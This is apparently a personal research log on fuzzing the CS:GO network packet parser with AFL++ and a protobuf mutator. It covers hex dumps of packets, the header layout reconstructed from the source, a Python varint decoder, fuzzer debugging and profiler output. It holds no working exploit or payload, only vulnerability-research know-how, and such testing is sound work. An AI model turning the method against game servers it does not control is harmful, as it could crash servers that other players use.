game/shared/cstrike15/cs_econ_item_string_table.cpp
game/shared/econ/econ_item.cpp
game/server/cstrike15/cs_gameinterface.cpp
thirdparty/protobuf-2.5.0/src/unknown_field_set.o
thirdparty/protobuf-2.5.0/src/text_format.o
thirdparty/protobuf-2.5.0/src/descriptor_database.o
thirdparty/protobuf-2.5.0/src/descriptor.o
thirdparty/protobuf-2.5.0/src/protoc
thirdparty/protobuf-2.5.0/src/.libs/libprotobuf.a
thirdparty/protobuf-2.5.0/src/.libs/libprotobuf-lite.a
thirdparty/protobuf-2.5.0/src/google/protobuf/message_lite.cc
thirdparty/protobuf-2.5.0/src/google/protobuf/message_lite.h
thirdparty/protobuf-2.5.0/src/google/protobuf/message_unittest.cc
thirdparty/protobuf-2.5.0/src/google/protobuf/descriptor_database.cc
thirdparty/protobuf-2.5.0/src/google/protobuf/unknown_field_set.h
thirdparty/protobuf-2.5.0/src/google/protobuf/wire_format_unittest.cc
thirdparty/protobuf-2.5.0/src/google/protobuf/unknown_field_set.cc
thirdparty/protobuf-2.5.0/src/message_lite.o
thirdparty/protobuf-2.5.0/python/google/protobuf/pyext/python_descriptor.cc
lib/linux64/release/libprotobuf.a
lib/public/2013/libprotobuf.lib
lib/public/osx64/libprotobuf.a
lib/public/libprotobuf.lib
lib/public/2015/libprotobuf.lib
lib/public/2015/steamdatagramlib.lib
lib/public/linux64/kisak_gcsdk_client.a
lib/public/linux64/steamdatagramlib_client.a
lib/public/linux64/libsteam_api.so
lib/public/linux64/thing.so
lib/public/linux64/gcsdk_client.a
lib/public/linux64/fejfewfew.so
lib/public/linux64/libprotobuf.a
lib/public/matchmakingbase_ds.lib
lib/public/steamdatagramlib.lib
lib/public/osx32/steamdatagramlib.a
lib/public/osx32/libprotobuf.a
lib/public/osx32/libprotobuf-lite.a
lib/public/linux32/steamdatagramlib_client.a
lib/public/linux32/vgui_controls.a
lib/public/linux32/libprotoc.a
lib/public/linux32/steamdatagramlib.a
lib/public/linux32/matchmakingbase_ds.a
lib/public/linux32/gcsdk.a
lib/public/linux32/libprotobuf.a
lib/public/linux32/libprotobuf-lite.a
lib/public/gcsdk_gc.lib
lib/public/matchmakingbase.lib
lib/public/vgui_controls.lib
lib/public/gcsdk.lib
common/netmessages.h
devtools/bin/osx32/protoserviceplugin
devtools/bin/osx32/protoc
devtools/bin/linux/protoc
public/gcsdk/sdocache.h
public/gcsdk_original/sdocache.h

```
{% endraw %}


And as it turns out this ParseFromArray is an external function in protobuf (https://stackoverflow.com/questions/19854042/when-parsefromarray-return-true-in-protocol-buffer):

So, to use the protobuf fuzzer we basically need to reconstruct these packages from the protobuf buffer backwards because csgo does not use the protobuf protocol exclusively. It has layers on top of it (like these header layers).

I am also dumping the headers before the protobuf messages.


------------------------------------------------------------

## Reconstruction of packages

So the attack plan has changed a bit. Now to use the protobuf fuzzer we need to build the packages from the bottom up.

If we take a look at one of the protobuf packets (with the header):

{% raw %}
```
cyberhacker@cyberhacker-h8-1131sc:~/Codecoveragething/game/investigation$ xxd -g 1 packet399.dat
00000000: 78 00 00 00 18 01 00 00 00 00 04 0f 08 da 02 20  x.............. 
00000010: 81 ae 22 28 c0 f3 05 30 de fd 05 1a 8a 03 08 c1  .."(...0........
00000020: 04 10 12 18 01 20 00 28 01 30 d4 02 3a f9 02 01  ..... .(.0..:...
00000030: 07 93 90 84 2b fc ff 30 5d 01 00 00 f9 00 00 87  ....+..0].......
00000040: be 86 3b 00 23 c0 4c ca 24 b8 c5 98 12 0e ff bf  ..;.#.L.$.......
00000050: 0b 00 3d fb 0f 58 33 d8 d0 ff 78 c5 04 d0 a1 8c  ..=..X3...x.....
00000060: 96 0a 4a 00 9e 4e 00 33 29 93 e0 16 63 4a 38 fc  ..J..N.3)...cJ8.
00000070: ff 2e 00 80 77 3d b8 4b 4e 43 f0 65 8f 58 40 0d  ....w=.KNC.e.X@.
00000080: a9 bb 15 28 01 10 06 01 cc a4 4c 82 5b 8c 29 e1  ...(......L.[.).
00000090: f0 ff bb 00 00 2a f5 00 1c d2 04 c1 97 3d 62 01  .....*.......=b.
000000a0: 1d ca be 91 84 04 40 18 04 30 93 32 09 6e 31 a6  ......@..0.2.n1.
000000b0: 84 c3 ff ef 02 40 cf fe 03 d7 be 2f f4 3f 5e 31  .....@...../.?^1
000000c0: 01 d4 90 da ce 21 12 80 a7 13 c0 4c ca 24 54 66  .....!.....L.$Tf
000000d0: 31 a6 84 c3 ff ef 02 40 cf fe 03 db 43 36 f4 3f  1......@....C6.?
000000e0: 5e 31 01 94 97 a0 2e a5 70 08 3a ab 82 12 80 a7  ^1......p.:.....
000000f0: 13 c0 4c ca 24 1c b3 18 53 c2 e1 ff 77 01 a0 67  ..L.$...S...w..g
00000100: ff 81 ea ab 1b 82 2f 7b c4 02 02 f0 00 00 00 00  ....../{........
00000110: 38 ed 41 09 80 30 08 60 26 65 12 0a 5a 0a 3f 85  8.A..0.`&e..Z.?.
00000120: ff df 05 00 88 bd 07 10 88 2c e8 b3 15 a5 10 08  .........,......
00000130: 00 00 a0 7e fb 57 b3 00 cc a4 4c 48 c6 94 70 f8  ...~.W....LH..p.
00000140: ff 5d 00 e8 d9 7f 50 ec 67 87 fe c7 2b 26 80 e0  .]....P.g...+&..
00000150: f6 a4 04 e0 e9 04 30 93 32 09 05 2d c6 94 70 f8  ......0.2..-..p.
00000160: ff 5d 00 e8 d9 7f 00 7a 84 82 fe c7 2b 26 80 00  .].....z....+&..
00000170: 00 00 6b 7c 40 02 f0 74 3a 43 a8 f8 ff 03 21 01  ..k|@..t:C....!.
00000180: 15 ff 7f 20 64 a0 e2 ff 0f 84 04 54 fc ff 81 90  ... d......T....
00000190: 81 8a ff 3f 10 32 50 f1 ff 07 42 06 2a fe ff 40  ...?.2P...B.*..@
000001a0: 48 40 c5 ff 1f 08 01 de                          H@......


```
{% endraw %}
this is the protobuf message:

{% raw %}
```
cyberhacker@cyberhacker-h8-1131sc:~/Codecoveragething/game/investigation$ xxd -g 1 protobufpacket1291.dat
00000000: 08 c1 04 10 12 18 01 20 00 28 01 30 d4 02 3a f9  ....... .(.0..:.
00000010: 02 01 07 93 90 84 2b fc ff 30 5d 01 00 00 f9 00  ......+..0].....
00000020: 00 87 be 86 3b 00 23 c0 4c ca 24 b8 c5 98 12 0e  ....;.#.L.$.....
00000030: ff bf 0b 00 3d fb 0f 58 33 d8 d0 ff 78 c5 04 d0  ....=..X3...x...
00000040: a1 8c 96 0a 4a 00 9e 4e 00 33 29 93 e0 16 63 4a  ....J..N.3)...cJ
00000050: 38 fc ff 2e 00 80 77 3d b8 4b 4e 43 f0 65 8f 58  8.....w=.KNC.e.X
00000060: 40 0d a9 bb 15 28 01 10 06 01 cc a4 4c 82 5b 8c  @....(......L.[.
00000070: 29 e1 f0 ff bb 00 00 2a f5 00 1c d2 04 c1 97 3d  )......*.......=
00000080: 62 01 1d ca be 91 84 04 40 18 04 30 93 32 09 6e  b.......@..0.2.n
00000090: 31 a6 84 c3 ff ef 02 40 cf fe 03 d7 be 2f f4 3f  1......@...../.?
000000a0: 5e 31 01 d4 90 da ce 21 12 80 a7 13 c0 4c ca 24  ^1.....!.....L.$
000000b0: 54 66 31 a6 84 c3 ff ef 02 40 cf fe 03 db 43 36  Tf1......@....C6
000000c0: f4 3f 5e 31 01 94 97 a0 2e a5 70 08 3a ab 82 12  .?^1......p.:...
000000d0: 80 a7 13 c0 4c ca 24 1c b3 18 53 c2 e1 ff 77 01  ....L.$...S...w.
000000e0: a0 67 ff 81 ea ab 1b 82 2f 7b c4 02 02 f0 00 00  .g....../{......
000000f0: 00 00 38 ed 41 09 80 30 08 60 26 65 12 0a 5a 0a  ..8.A..0.`&e..Z.
00000100: 3f 85 ff df 05 00 88 bd 07 10 88 2c e8 b3 15 a5  ?..........,....
00000110: 10 08 00 00 a0 7e fb 57 b3 00 cc a4 4c 48 c6 94  .....~.W....LH..
00000120: 70 f8 ff 5d 00 e8 d9 7f 50 ec 67 87 fe c7 2b 26  p..]....P.g...+&
00000130: 80 e0 f6 a4 04 e0 e9 04 30 93 32 09 05 2d c6 94  ........0.2..-..
00000140: 70 f8 ff 5d 00 e8 d9 7f 00 7a 84 82 fe c7 2b 26  p..].....z....+&
00000150: 80 00 00 00 6b 7c 40 02 f0 74 3a 43 a8 f8 ff 03  ....k|@..t:C....
00000160: 21 01 15 ff 7f 20 64 a0 e2 ff 0f 84 04 54 fc ff  !.... d......T..
00000170: 81 90 81 8a ff 3f 10 32 50 f1 ff 07 42 06 2a fe  .....?.2P...B.*.
00000180: ff 40 48 40 c5 ff 1f 08 01 de                    .@H@......



```
{% endraw %}

and the header:

{% raw %}
```
cyberhacker@cyberhacker-h8-1131sc:~/Codecoveragething/game/investigation$ xxd -g 1 header1185.dat
00000000: 78 00 00 00 18 01 00 00 00 00 04 0f 08 da 02 20  x.............. 
00000010: 81 ae 22 28 c0 f3 05 30 de fd 05 1a 8a 03        .."(...0......

```
{% endraw %}


the header is 0x1e (index 0x1d does not exist so therefore it is 0x1e bytes long) bytes long it seems.

So our task is to figure out what those 0x1e bytes in this case have been.

Let's start working backwards:

in the ReadFromBuffer function:

{% raw %}
```
	virtual bool ReadFromBuffer( bf_read &buffer )
	{
		// MODIFIED:
		ConMsg("Called ReadFromBuffer\n");

		int size = buffer.ReadVarInt32();
		ConMsg("Size of protobuf message taken from message: 0x%x\n", size);

		if ( size < 0 || size > NET_MAX_PAYLOAD )
		{
			return false;
		}

		// Check its valid
		if ( size > buffer.GetNumBytesLeft() )
		{
			return false;
		}

		// If the read buffer is byte aligned, we can parse right out of it
		
		if ( ( buffer.GetNumBitsRead() % 8 ) == 0 )
		{
			// dump raw protobuf message:
			ConMsg("Size of header before protobuf message: 0x%x\n", buffer.GetNumBytesRead());

			ConMsg("Dumping protobuf:\n");
			dump_protobuf(buffer.GetBasePointer() + buffer.GetNumBytesRead(), size);
			ConMsg("Dumping header:\n");
			dump_header(buffer.GetBasePointer(), buffer.GetNumBytesRead());
			bool parseResult = PB_OBJECT_TYPE::ParseFromArray( buffer.GetBasePointer() + buffer.GetNumBytesRead(), size );
			

			buffer.SeekRelative( size * 8 );
			return parseResult;
		}


```
{% endraw %}

So the 4 bytes before the start of the actual protobuf message we have the length of the protobuf buffer itself.

and looking at the original packet we see that it is true:

Size of protobuf message taken from message: 0x18a

This may strike you as odd, but it isn't really when looking at the code:

{% raw %}
```
uint32 old_bf_read::ReadVarInt32()
{
	uint32 result = 0;
	int count = 0;
	uint32 b;

	do 
	{
		if ( count == bitbuf::kMaxVarint32Bytes ) 
		{
			// If we get here it means that the fifth bit had its
			// high bit set, which implies corrupt data.
			Assert( 0 );
			return result;
		}
		b = ReadUBitLong( 8 );
		result |= (b & 0x7F) << (7 * count);
		++count;
	} while (b & 0x80);

	return result;
}


```
{% endraw %}

So the ReadVarInt32 actually reads a variable amount of bytes and actually discards the last bit of the byte which tells if the byte is the last byte in the sequence. Look at this:

{% raw %}
```

#!/bin/python3

'''
This code implements the following C-code but in python:

uint32 old_bf_read::ReadVarInt32()
{
	uint32 result = 0;
	int count = 0;
	uint32 b;

	do 
	{
		if ( count == bitbuf::kMaxVarint32Bytes ) 
		{
			// If we get here it means that the fifth bit had its
			// high bit set, which implies corrupt data.
			Assert( 0 );
			return result;
		}
		b = ReadUBitLong( 8 );
		result |= (b & 0x7F) << (7 * count);
		++count;
	} while (b & 0x80);

	return result;
}


'''


class bf_read:
	def __init__(self, bytes_stuff):
		print("bytes_stuff == "+str(bytes_stuff))
		self.bytes = bytes_stuff
		self.counter = 0

	def ReadByte(self):

		result = self.bytes[self.counter]
		self.counter += 1
		return result



	def ReadVarInt32(self):
		result = 0
		count = 0
		b = 0x80

		while (b & 0x80):
			b = self.ReadByte()
			result |= (b & 0x7f) << (7* count)
			count += 1
		return result


def to_bytes(hex_string):
	return bytearray.fromhex(hex_string)

if __name__=="__main__":
	hex_string = str(input("Please input hex_string: "))
	reader = bf_read(to_bytes(hex_string))
	print(hex(reader.ReadVarInt32()))




```
{% endraw %}

then inputting 8a03 returns 0x18a so yeah. So we need to prepend the length of the protobuf buffer to the message. Next up is the command number:

{% raw %}
```
unsigned char cmd = buf.ReadVarInt32();
```
{% endraw %}

0x1a


actually I am now realizing that the packet which we are looking at is actually two or more packets. See there is the:

{% raw %}
```

cyberhacker@cyberhacker-h8-1131sc:~/Codecoveragething/game/investigation$ xxd -g 1 header1185.dat
00000000: 78 00 00 00 18 01 00 00 00 00 04 0f 08 da 02 20  x.............. 
00000010: 81 ae 22 28 c0 f3 05 30 de fd 05 1a 8a 03        .."(...0......


```
{% endraw %}

part, but in the ProcessMessages function:

{% raw %}
```
		INetMessageBinder *pMsgBind = ((CNetChan *)m_pActiveChannel)->FindMessageBinder( cmd, 0 );
		if ( pMsgBind )
		{
			int startbit = buf.GetNumBitsRead();
				
			INetMessage	* netmsg = pMsgBind->CreateFromBuffer( buf );
			if ( !netmsg )
			{
				Msg( "Netchannel: failed reading message %d from %s.\n", cmd, GetAddress() );
				Assert ( 0 );
				return false;
			}

			netmsg->SetReliable( wasReliable );

			UpdateMessageStats( netmsg->GetGroup(), buf.GetNumBitsRead() - startbit );

			if ( showmsgname )
			{
				if ( (*showmsgname == '1') || !Q_stricmp(showmsgname, netmsg->GetName() ) )
				{
					Msg("Msg from %s: %s\n", GetAddress(), netmsg->GetName() );
					Msg("%s\n", netmsg->ToString() );
				}
			}

			if ( blockmsgname )
			{
				if ( (*blockmsgname== '1') || !Q_stricmp(blockmsgname, netmsg->GetName() ) )
				{
					Msg("Blocking message %s\n", netmsg->ToString() );
					continue;
				}
			}

			int iMsgHandler = 1;
			do
			{
				// netmessage calls the Process function that was registered by it's MessageHandler
				m_bProcessingMessages = true;
				bool bRet = pMsgBind->Process( *netmsg );
				m_bProcessingMessages = false;

				// This means we were deleted during the processing of that message.
				if ( m_bShouldDelete )
				{
					Warning("m_bShouldDelete\n");
					ConMsg("m_bShouldDelete\n");
					delete netmsg;
					delete this;
					return false;
				}

				// This means our message buffer was freed or invalidated during the processing of that message.
				if ( m_bStopProcessing )
				{
					Warning("m_bStopProcessing\n");
					ConMsg("m_bStopProcessing\n");
					delete netmsg;
					return false;
				}

				if ( !bRet )
				{
					ConDMsg( "Netchannel: failed processing message %s.\n", netmsg->GetName() );
					Assert ( 0 );
					delete netmsg;
					return false;
				}

				if ( IsOverflowed() )
				{
					Warning("IsOverflowed returned true.\n");
					ConMsg("IsOverflowed returned truefefe\n");
					delete netmsg;
					return false;
				}

				// Because we are moving to another net message, we have to clone it
				pMsgBind = ( ( CNetChan * )m_pActiveChannel )->FindMessageBinder( cmd, iMsgHandler++ );
			} while( pMsgBind );

```
{% endraw %}

there is the while ( pMsgBind ) loop which loops through one packet.

{% raw %}
```
cyberhacker@cyberhacker-h8-1131sc:~/Codecoveragething/game/investigation$ xxd -g 1 header1185.dat
00000000: 78 00 00 00 18 01 00 00 00 00 04 0f 08 da 02 20  x.............. 
00000010: 81 ae 22 28 c0 f3 05 30 de fd 05 1a 8a 03        .."(...0......

```
{% endraw %}

And the length of the first header is 0xc: 

{% raw %}
```
subchan->sendSeqNr == 0xffffffff
subchan->sendSeqNr == 0xffffffff
End of packet header debugging.
Calling ProcessMessages!
Called ReadFromBuffer
Size of protobuf message taken from message: 0xf
Size of header before protobuf message: 0xc
Dumping protobuf:
Called dump_protobuf
Dumping protobuffer to file protobufpacket1290.dat
Dumping header:
```
{% endraw %}

and:

{% raw %}
```
cyberhacker@cyberhacker-h8-1131sc:~/Codecoveragething/game/investigation$ xxd -g 1 protobufpacket1290.dat
00000000: 08 da 02 20 81 ae 22 28 c0 f3 05 30 de fd 05     ... .."(...0...

```
{% endraw %}

so the first header is `78 00 00 00 18 01 00 00 00 00 04 0f` .

the length is correct (0x0f) the command is 4 (0x04):

{% raw %}
```
unsigned char cmd = buf.ReadVarInt32();
```
{% endraw %}

These are the headers which are shared upon all of the messages in one packet.

therefore these bytes: `78 00 00 00 18 01 00 00 00 00` are the packet header itself.

First, the 	if ( flags & PACKET_FLAG_RELIABLE ) is not taken, because flags==0 in this case.

The ProcessPacketHeader basically handles these bytes:

{% raw %}
```

int CNetChan::ProcessPacketHeader( netpacket_t * packet )
{
	// get sequence numbers		
	int sequence	= packet->message.ReadLong(); // first four bytes (78 00 00 00)
	int sequence_ack= packet->message.ReadLong(); // the four bytes after that (18 01 00 00)
	int flags		= packet->message.ReadByte(); // one byte 


```
{% endraw %}
because we do not have the CheckSum thing (we patched it to not even put those in it.) we do not have it in the packet. The last byte is this:


{% raw %}
```
int relState	= packet->message.ReadByte();
```
{% endraw %}

So I think that that is everything what we need to patch the packets. So just patch the sequence stuff and then the flags and then the reliable thing which is also zero.

Lets program the patching function first in python before trying to program it in c code.

----------------

Except that there is one wrinkle. The message id of the protobuf message is hard to acquire. I do not know how to get the message id of the protobuf message from the protobuf message itself. See, the fuzzer only returns the protobuf message itself. We then need to prepend that with the length (easy part) and with the message id (hard part). How I am going to know what message the said message is is completely lost on me.

Fuck doing it in C. We are going to do it in python.

After a bit of research it came to my attention that you can not determine the type of a message from an arbitrary buffer. https://stackoverflow.com/questions/32639905/protobuf-determining-message-type-to-deserialize

This is a bit of a shitty situation, because we need the type for the message before we can patch it (obviously) .

Maybe we can dump the packet with the id and length header and then use that in the fuzzer itself to determine the type of a protobuf packet and then mutate that using the protofuzz mutator maybe?


Now that that is done, we need to program the fuzzer to patch the packet in a proper manner.

The msg_id + msg_len + msg_body combo is placed 10 bytes from the start of the packet buffer, because the first four bytes are the sequence number and then the next four bytes after that we have the sequence_ack and then the flag byte and then the reliable state byte (`int relState	= packet->message.ReadByte();`). We are going to set the flags and relState to zero because reasons.

Ok, so now we have done that, now we just need to dump the protobuf messages with the id and length header before dumping them to a file. I think that this will be a bit of a doozey, but I think that I will manage it.

-----------------

Dumping the message does not work for some odd reason. My code dumps a bit more than what the message actually consists of (actually exactly one byte more) .


After fixing that bug we can not dump the messages. Now , the fuzzer just copies the message from the input and then patches the sequence data at the start and then passes that to ProcessPacket. Let's try it.



aaandd the same python buf appears in the afl-fuzz thing. What bug do you say? During my development of the fuzzer I need to run the program with a kinda specific python version (3.9) for it to work, because the program used stuff which was not yet implemented for python3.8:


{% raw %}
```

AttributeError: module 'importlib.resources' has no attribute 'files'

[-] PROGRAM ABORT : python custom fuzz: call failed
         Location : fuzz_py(), src/afl-fuzz-python.c:148


```
{% endraw %}

but no worries. By modding the Makefile for the afl-fuzz thing I can bypass that and have it link against the python3.9 headers instead of the python3.8 headers and we should be fine.

Ok so after a bit of tweaking the first proper fuzz run with this mutator causes a segfault. And not like a segfault in the fuzzed program, but in the fuzzer itself. Maybe run with gdb and see what is wrong?

I am tired of waiting for the thing to spin up every time I want to debug a problem in the fuzzer, so I am going to make a minimal example real quick:

{% raw %}
```
#include<stdio.h>

int main()
{
    char string[10000];
    int thing;
    printf("Enter the string: ");
    thing = read(0,string,sizeof(string));
    if (thing == 10) {
        printf("oof\n");
    }
    printf("\n %s",string);
    return 0;
}


```
{% endraw %}
This is just a quick minimal example.

Lets look at the backtrace:

{% raw %}
```
[!] WARNING: Some test cases look useless. Consider using a smaller set.
[+] Here are some useful stats:

    Test case count : 1 favored, 0 variable, 19 ignored, 20 total
       Bitmap range : 1 to 1 bits (average: 1.00 bits)
        Exec timing : 185 to 185 us (average: 201 us)

[*] -t option specified. We'll use an exec timeout of 30000 ms.
[+] All set and ready to roll!

Program received signal SIGSEGV, Segmentation fault.
__memmove_sse2_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:365
365	../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S: No such file or directory.
(gdb) where
#0  __memmove_sse2_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:365
#1  0x000055555557244d in memcpy (__len=<optimized out>, __src=<optimized out>, __dest=<optimized out>, __dest=<optimized out>, __src=<optimized out>, __len=<optimized out>) at /usr/include/x86_64-linux-gnu/bits/string_fortified.h:34
#2  fuzz_py (py_mutator=0x5555555d0aa0, buf=<optimized out>, buf_size=4, out_buf=0x7fffffff77a8, add_buf=<optimized out>, add_buf_size=<optimized out>, max_size=1048576) at src/afl-fuzz-python.c:138
#3  0x0000555555581a2d in fuzz_one_original (afl=0x7ffff74f7010) at src/afl-fuzz-one.c:1926
#4  0x00005555555606a9 in fuzz_one (afl=0x7ffff74f7010) at src/afl-fuzz-one.c:5824
#5  main (argc=<optimized out>, argv_orig=<optimized out>, envp=<optimized out>) at src/afl-fuzz.c:2550
(gdb) 



```
{% endraw %}

Ok so after a bit of debugging I found out that the problem is that we are returning an object of type "bytes" but we need to return a message of type "bytearray". After that fix, we now no longer segfault on the minimal thing. Let's try it on the actual binary.

Now the fuzzer actually runs fine even on the actual binary, except that we get a concerning error in the console.log file:

{% raw %}
```
Packet buffer for loopback written to crashingpacket1559.dat
GetSequenceData returned these:
OutSequenceNumber: 0x121
InSequenceNumber: 0x650
OutSequenceNumberAck: 0x6f5
Calling ProcessMessages!
Calling ProcessMessages!
Netchannel: failed reading message 15 from loopback.
Checking stuff:
Packet buffer for loopback written to crashingpacket1560.dat
GetSequenceData returned these:
OutSequenceNumber: 0x121
InSequenceNumber: 0x651
OutSequenceNumberAck: 0x6f6
Calling ProcessMessages!
Calling ProcessMessages!
Netchannel: failed reading message 15 from loopback.
Checking stuff:
Packet buffer for loopback written to crashingpacket1561.dat
GetSequenceData returned these:
OutSequenceNumber: 0x121
InSequenceNumber: 0x652
OutSequenceNumberAck: 0x6f7
Calling ProcessMessages!
Calling ProcessMessages!
Netchannel: failed reading message 15 from loopback.
Checking stuff:
Packet buffer for loopback written to crashingpacket1562.dat
GetSequenceData returned these:
OutSequenceNumber: 0x121
InSequenceNumber: 0x653
OutSequenceNumberAck: 0x6f8
Calling ProcessMessages!
Calling ProcessMessages!
Netchannel: failed reading message 15 from loopback.
Checking stuff:


```
{% endraw %}


This means that either our mutator is somehow buggy or that our c code is buggy. Lets take a look at the mutator first.

Now adding a bunch of checks to the mutator it doesn't really seem like the mutator is the problem. The length gets encoded the right way and so does the command.

After a bit of digging I found the bug.

{% raw %}
```

packet = NET_GetPacketmodded(socket, scratch.GetBuffer(), packet_buffer, len);

```
{% endraw %}
changed this to:
{% raw %}
```

packet = NET_GetPacketmodded(socket, scratch.GetBuffer(), packet_buffer, len+10);

```
{% endraw %}

that seems to have done the trick.

Now I actually came accross another bug which is that the fuzzer crashes if you do not have the csgo window up at the same time. Now, lets just dump a shitload of the messages and then we should run afl-cmin on it. No need to really run afl-tmin, because I think that the contents are already quite good. Also it would take like a shitload of time to run.

One thing which I realized while using the afl-cmin script is that the afl-cmin script completely ignores ASAN_OPTIONS which are set before calling it.

This is because afl-cmin is actually a bash script which just runs through all of the files and in it there is this:

{% raw %}
```
export AFL_QUIET=1
export ASAN_OPTIONS=detect_leaks=0     <--- Here we set the asan options
THISPATH=`dirname ${0}`
export PATH="${THISPATH}:$PATH"
```
{% endraw %}


Yeah, afl-cmin does not work, because it causes another instance of the fuzzer to be completely setup for the trace thing which sucks donkey dick, but it is what it is.

Instead of that I am just going to get one of every type of message and just be done with that.

I am now going to fuzz the program for a while and lets see what happens!

Except lets not. After a bit of fuzzing the fuzzer stops. This is because the code is littered with Host_EndGame calls, which, as the name suggests, ends the game.

We need to patch that out.

Now it works good.





## Improving the dogshit mutator



{% raw %}
```
message_type: CNETMsg_Tick
         335499665 function calls (334670926 primitive calls) in 131.350 seconds

   Ordered by: standard name

   ncalls  tottime  percall  cumtime  percall filename:lineno(function)
        1    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:1002(_find_and_load)
        1    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:1018(_gcd_import)
       55    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:1033(_handle_fromlist)
        2    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:112(release)
        1    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:152(__init__)
        1    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:156(__enter__)
        1    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:160(__exit__)
        2    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:166(_get_module_lock)
        2    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:185(cb)
        1    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:203(_lock_unlock_module)
        6    0.000    0.000    0.036    0.006 <frozen importlib._bootstrap>:220(_call_with_frames_removed)
        6    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:231(_verbose_message)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:35(_new_module)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:351(__init__)
        6    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:385(cached)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:398(parent)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:406(has_location)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:486(_init_module_attrs)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:558(module_from_spec)
        2    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:58(__init__)
        2    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:87(acquire)
        1    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap>:948(_sanity_check)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:1011(__init__)
        6    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:1036(get_filename)
        6    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:1041(get_data)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:1082(path_stats)
        3    0.000    0.000    0.001    0.000 <frozen importlib._bootstrap_external>:1087(_cache_bytecode)
        3    0.000    0.000    0.001    0.000 <frozen importlib._bootstrap_external>:1092(set_data)
        9    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:121(_path_join)
        9    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:123(<listcomp>)
       15    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:127(_path_split)
       30    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:129(<genexpr>)
       12    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:135(_path_stat)
        6    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:145(_path_is_mode_type)
        6    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:159(_path_isdir)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:1634(_get_supported_file_loaders)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:175(_path_isabs)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:180(_write_atomic)
        6    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:361(cache_from_source)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:491(_get_cached)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:503(_calc_mode)
        6    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:523(_check_name_wrapper)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:658(_code_to_timestamp_pyc)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:696(spec_from_file_location)
        9    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:74(_pack_uint32)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:838(is_package)
        3    0.000    0.000    0.000    0.000 <frozen importlib._bootstrap_external>:846(create_module)
        3    0.000    0.000    0.037    0.012 <frozen importlib._bootstrap_external>:849(exec_module)
        3    0.000    0.000    0.020    0.007 <frozen importlib._bootstrap_external>:913(source_to_code)
        3    0.000    0.000    0.022    0.007 <frozen importlib._bootstrap_external>:921(get_code)
        6    0.000    0.000    0.000    0.000 <string>:1(<lambda>)
        1    0.000    0.000  131.350  131.350 <string>:1(<module>)
        1    0.000    0.000    0.000    0.000 __init__.py:109(import_module)
        1    0.000    0.000    0.000    0.000 _collections_abc.py:766(__contains__)
        1    0.000    0.000    0.000    0.000 _common.py:17(fallback_resources)
        1    0.000    0.000    0.000    0.000 _common.py:9(from_package)
    86707    0.024    0.000    0.228    0.000 abc.py:100(__subclasscheck__)
    86710    0.022    0.000    0.300    0.000 abc.py:96(__instancecheck__)
      241    0.000    0.000    0.000    0.000 api_implementation.py:136(Type)
     4076    0.002    0.000    0.002    0.000 api_implementation.py:146(IsPythonDefaultSerializationDeterministic)
    12190    0.006    0.000    0.006    0.000 containers.py:192(__init__)
     7802    0.003    0.000    0.003    0.000 containers.py:202(__getitem__)
     2583    0.002    0.000    0.002    0.000 containers.py:206(__len__)
       33    0.000    0.000    0.000    0.000 containers.py:237(__init__)
       33    0.000    0.000    0.000    0.000 containers.py:249(append)
    12157    0.041    0.000    0.047    0.000 containers.py:350(__init__)
    10620    0.072    0.000    0.425    0.000 containers.py:368(add)
     2315    0.006    0.000    0.095    0.000 containers.py:379(extend)
     2315    0.001    0.000    0.096    0.000 containers.py:393(MergeFrom)
        6    0.000    0.000    0.000    0.000 contextlib.py:383(_create_cb_wrapper)
        6    0.000    0.000    0.000    0.000 contextlib.py:385(_exit_wrapper)
        3    0.000    0.000    0.000    0.000 contextlib.py:389(__init__)
        6    0.000    0.000    0.000    0.000 contextlib.py:433(callback)
        6    0.000    0.000    0.000    0.000 contextlib.py:451(_push_exit_callback)
